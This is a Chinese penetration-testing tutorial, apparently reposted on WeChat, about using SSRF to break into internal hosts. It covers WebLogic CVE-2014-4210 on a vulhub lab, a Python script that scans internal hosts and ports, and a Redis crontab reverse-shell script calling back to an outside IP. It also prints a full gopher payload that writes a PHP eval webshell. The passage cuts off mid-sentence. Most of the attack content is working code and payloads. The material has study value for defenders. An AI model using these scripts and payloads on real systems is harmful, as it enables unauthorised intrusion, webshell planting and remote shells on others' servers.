---
title: 实战 | 利用SSRF渗透内网主机-上
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496298&idx=1&sn=84b16dd203168030e678bd35137fb01d&chksm=e8a5f809dfd2711f9d5a30b50c8fea9151bf158cc1d44193f674b7db2120ae5d26d0235707ea&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-11-07
fetch_date: 2025-10-06T19:19:09.626367
---

# 实战 | 利用SSRF渗透内网主机-上

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj54Jt5ic25wzl7IBCUBsKvLTfSu8m3vOHAFr9YtQQoJGsT9S7uia9EBTeics1KWhJxFHOXLHowAgN4mQ/0?wx_fmt=jpeg)

# 实战 | 利用SSRF渗透内网主机-上

迪哥讲事

以下文章来源于HACK学习呀
，作者Ulysses

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM40Ey25ia7icKDtM0hyhYQeTnJdaC9NzZRHPkFM71EAD3Fw/0)

**HACK学习呀**
.

HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

## 利用WebLogic的SSRF漏洞探测内网信息

### 漏洞描述

Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

**CVE编号**：CVE-2014-4210

**影响范围**：

•Oracle WebLogic Server 10.3.6.0•Oracle WebLogic Server 10.0.2.0

### 环境搭建

下载vulhub：`git clone https://github.com/vulhub/vulhub.git`

进入目录：`cd vulhub/weblogic/ssrf/`

启动环境：`docker-compose up -d`

访问：`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`

出现以下页面，说明测试环境ok。

### 漏洞复现

开启Burp代理，提交表单

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3q00t7YSn5MBZGKBkTwEOicoUcV09HYolSnENaNTyHokCeeRUicdCrnfQ/640?wx_fmt=png)

image-20211127214445369

从返回页面的结果的报错上看，当提交表单的时候会访问下面这个URL，并做XMLSoap解析，这个错误就是我们SSRF漏洞产生的关键点

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3VaibPr4ApbqwCDtKdn2jXXF7y8LviaiaQHl8ictPYSeexjpXNbhp4aEniaQ/640?wx_fmt=png)

image-20211127215236521

为了验证是否存在SSRF漏洞，我们将operator的值改为DNSLog生成的记录

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3sy8tVSOplnmpa9sTZeT7LTWkEkhFMoX3NIgicaFKlER9qSWObqZyR7g/640?wx_fmt=png)

image-20211127220322683

在DNSLog中可以看到请求的内容，说明存在SSRF漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3nt0ib3GFeqa8JVoHTn6x56yKgHUnwlefNk50u9IVoJKREPJ12Rmic5lg/640?wx_fmt=png)

### 探测内网存活IP

若ip不存在时返回如下信息（会一直请求该地址，直到超时）

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3nQjeWI1icut2pia2lSyLMbXsyIyF4u6Kw05XuUKt1vnPmY21TNCndvZQ/640?wx_fmt=png)

image-20211127233025326

若ip存在则返回如下信息

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3RhicsnM6LN5yTQS8nJ8icP7VvAicbXTk6RdoMU4lWVNA4bvzc3icy9cXoQ/640?wx_fmt=png)

image-20211127223539057

### 探测端口

若端口不开放返回如下信息

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD304NOq3c478ftB329213JP6eCC8DS2c2fUNlh14tVWoBVjtL28M2qVg/640?wx_fmt=png)

image-20211127233755211

若端口开放返回如下信息（分两种情况）

若开放的端口为非Web端口

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3tbZtswBSvqORhnX4OQ5K4vMfSQ9aq4VuCqRWnjdfEnQegXAjfz4ichw/640?wx_fmt=png)

image-20211127224151445

若开放的端口为Web端口（还分为请求类型是否为text/html）

text/html类型

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3KZV6ST49QK7wKSdtD8eickC9o08yT5aN0YLlia4V0qXdmfqdTaVzjwtg/640?wx_fmt=png)

image-20211127224433070

非text/html类型

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3ftnqeib5cIaj0MiaVOgTmF9sHsMXNzWTic3ACNyzlianS6srGFjo4Phg5g/640?wx_fmt=png)

image-20211127224519722

我们可以利用返回信息来进行内网探测

### 内网探测脚本编写

编写一个python脚本自动化探测内网的存活主机ip与开放端口

```
#!/usr/bin/env python
# coding: utf-8
# 功能：扫描内网开放ip及端口

import argparse
import thread
import time
import re
import requests

def ite_ip(ip):
    for i in range(1, 256):
        final_ip = '{ip}.{i}'.format(ip=ip, i=i)
        thread.start_new_thread(scan, (final_ip,))
        time.sleep(3)

def scan(final_ip):
    ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '6379', '4899', '8080', '7001', '8000')
    for port in ports:
        vul_url = args.url + '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search' % (final_ip, port)
        try:
            r = requests.get(vul_url, timeout=15, verify=False)
            result0 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
            result1 = re.findall('route to host', r.content)
            result2 = re.findall('but could not connect', r.content)
            if len(result0) != 0 and len(result1) == 0 and len(result2) == 0:
                out = "port exist: " + final_ip + ':' + port
                print out
        except Exception, e:
            pass

def get_ip():
    vul_url = args.url + '/uddiexplorer/SetupUDDIExplorer.jsp'
    r = requests.get(vul_url, timeout=15, verify=False)
    reg = re.compile(r"For example: http://\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\ b")
    result1 = reg.findall(r.content)
    result = ""
    if result1:
        result = result1[0].replace("For example: http://","")
    return result

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit')
    parser.add_argument('--url', dest='url', required=True, help='Target url')
    parser.add_argument('--ip', dest='scan_ip', help='IP to scan')
    args = parser.parse_args()
    ip = '.'.join(args.scan_ip.split('.')[:-1])
    #print ip
    #ip = get_ip()
    if ip:
        ite_ip(ip)
    else:
        print "no ip"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3cYCKUewpRa84lic1rz53804YuOUIfT6GXq3VVB0dLy12MhAg00CUGeA/640?wx_fmt=png)

image-20211127234237632

## SSRF结合Redis未授权访问GetShell

### 漏洞描述

Redis因配置不当可以未授权访问（窃取数据、反弹shell、数据备份操作主从复制、命令执行）。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。

在这里主要讲解SSRF的利用，所以就不对Redis的协议进行分析了，直接使用Exp进行利用。

之后会对Redis的漏洞进行深入学习。

> **常见redis反弹shell的bash脚本**
>
> `redis-cli -h $1 -p $2 flushall
> echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.86.131/8080 0>&1\n\n"|redis-cli -h $1 -p $2 -x set 1
> redis-cli -h $1 -p $2 config set dir /var/spool/cron/
> redis-cli -h $1 -p $2 config set dbfilename root
> redis-cli -h $1 -p $2 save
> redis-cli -h $1 -p $2 quit`
>
> •flushall：删除所有数据库中的所有key。这行代码感觉不是很有必要。。。•-x参数：从标准输入读取一个参数：•在redis的第0个数据库中添加key为1，value为`\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n`的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。•dir 数据库备份的文件放置路径•Dbfilename 备份文件的文件名

### 漏洞利用

推荐使用**Gopherus**可以帮助我们直接生成gopher payload，以利用SSRF GetShell。

项目地址：https://github.com/tarunkant/Gopherus

#### 写入WebShell

利用条件：

1.redis 需要对网站中的目录有写权限2.知道网站绝对路径

使用Gopherus生成payload：

```
./gopherus.py --exploit redis
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3U2DCjWhLW4p8DfGSj2lXysfAOP6kpugdS11HjBXvIZpicpYkicOdZ3Fg/640?wx_fmt=png)

image-20211129145802825

再对生成的payload进行URL编码，就是我们最终生成的payload

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3Xev50JkXayuQ2zYH9nDHhwldk72F68I9JEjwpGpNafOJDsMv4mo61A/640?wx_fmt=png)

image-20211129145938675

放入URL参数浏览器请求如下，成功执行Redis命令写入webshell。

```
http://hackroom.com/mylabs/ssrf/curl_exec.php?url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252436%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527hackme%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

成功写入WebShell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3uNJibPdU1wt4HIBvtFiagFj2IejrwusXJfVEBxXTNial1O1uH5unIMLwQ/640?wx_fmt=png)

image-20211129152046102

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouick5XIIYyw5VwaY4tAVRibD3HGib16bic1nXnaX8tsjhNobYRUvEW9ZgX3taFy99sEeSv9317kR0Tz4g/640?wx_fmt=png)

image-20211129153455684

#### crontab 定时任务反弹 shell

利用条件：

•Redis需要使用root用户启用（不是通过service或systemctl启动）•这个方法只能Centos上使用，Ubuntu上行不通，原因如下：

1.因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是600也就是`-rw-------`才会执行，否则会报错`(root) INSECURE MODE (mode 0600 expected)`，而Centos的定时任务文件`/var/spool/cron/<username>`权限644也能执行2.因为redis保存RDB会存在乱码，在Ubu...